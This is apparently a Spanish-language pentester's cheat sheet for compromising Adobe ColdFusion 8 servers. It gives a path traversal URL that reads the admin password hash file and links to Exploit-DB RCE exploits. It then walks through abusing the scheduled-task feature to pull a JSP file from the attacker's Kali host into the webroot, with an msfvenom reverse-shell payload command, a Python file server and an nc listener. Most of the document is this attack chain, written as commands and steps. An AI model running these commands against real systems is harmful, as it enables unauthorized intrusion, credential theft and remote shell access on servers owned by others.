# ColdFusion 8

Tags: #ColdFusion #Windows 

Es un **servidor de aplicaciones web** desarrollado originalmente por Allaire (1995), luego adquirido por Macromedia y actualmente propiedad de **Adobe**. Corre aplicaciones escritas en **CFML (ColdFusion Markup Language)**, un lenguaje de templates similar a HTML pero con lógica de servidor, parecido conceptualmente a PHP o JSP.


```bash 
❯ http://<IP>:8500/CFIDE/administrator/index.cfm    # Panel admin default
❯ http://<IP>:8500/CFIDE/administrator/             # Variante
❯ http://<IP>:8500/CFIDE/componentutils/            # Componentes expuestos

Es un producto similar a:
	- asp
	- jsp
	- php 
```

## Forma directa 

* [Adobe ColdFusion 8 - RCE](https://www.exploit-db.com/exploits/50057)

```bash 
❯ python adobeColdFusion.py    # Ejecutar para obtener un RCE

NOTA: 
	- Se debe modificar las IPs
```

## Forma manual 

* [Adobe ColdFusion 8 Path Traversal](https://www.exploit-db.com/exploits/14641)
* [Crackstation](https://crackstation.net/)

```bash 
# Leer un archivo interno del server y obtener la password de admin hasheada 
http://IP:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

```bash 
Una vez dentro como admin:

Paso 1: 
	http://IP:8500/CFIDE/administrator/settings/mappings.cfm   # En Mappings se exponen rutas importantes para ver donde cargar un archivo 

Paso 2: 
	http://IP:8500/CFIDE/administrator/scheduler/scheduletasks.cfm   # Crear una tarea 
	
	1. Task name = Pwned
	2. URL = http://IP_Kali/reverse.jsp
	3. Publish = Activar la casilla 'Save output to a file'
	4. File = C:\ColdFusion8\wwwroot\CFIDE\reverse.jsp     <-- Indicar ruta de exportación
	5. Submit 
	6. Dar click en 'Run Scheduled Task' para ejecutar la tarea ahora 

NOTA: 
	- Se debe de tener acceso desde la web al 'Index of / CFIDE' para poder ver el archivo cargado como 'reverse.jsp'
```

```bash 
Paso 3: 
# Despues de crear el archivo colocar la ruta en 'Scheduled Task' para cargarlo 
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP_Kali LPORT=443 -o reverse.jsp   # Crear el archivo malicioso pa

❯ python3 -m http.server 80     # Compartir el archivo 
```

```bash 
Paso 4: 
Dar click en el archivo 'reverse.jsp' cargado en 'Index of / CFIDE'

❯ rlwrap nc -nlvp 443     # Recibir la revershell 
```